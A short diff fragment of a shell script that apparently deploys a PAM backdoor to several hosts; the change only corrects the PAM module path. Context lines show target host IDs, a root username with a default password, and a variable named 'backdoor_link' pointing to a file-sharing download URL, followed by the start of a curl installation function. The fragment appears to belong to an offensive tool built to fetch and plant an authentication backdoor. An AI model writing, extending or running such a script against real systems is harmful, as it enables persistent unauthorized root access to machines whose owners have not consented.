@@ -7,7 +7,7 @@ host_ids=(111 121 131)
 username="root"
 default_password="Password1!"
 timeout_duration=3
-path_to_pam="/usr/lib/x86_64-linux-gnu/security"
+path_to_pam="/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
 install_curl() {
